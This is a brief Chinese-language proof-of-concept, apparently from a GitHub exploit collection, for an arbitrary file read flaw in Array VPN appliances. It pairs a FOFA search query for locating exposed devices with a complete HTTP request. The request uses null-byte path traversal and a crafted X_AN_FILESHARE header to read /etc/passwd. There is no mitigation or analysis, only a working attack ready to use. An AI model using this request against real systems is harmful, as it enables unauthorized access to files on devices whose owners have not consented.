## Array VPN任意文件读取漏洞

## fofa
```
product="Array-VPN"
```


## poc
```
GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close

```
![image](https://github.com/wy876/POC/assets/139549762/a6915f3f-2242-4d1d-b3a3-9ff452439cbc)
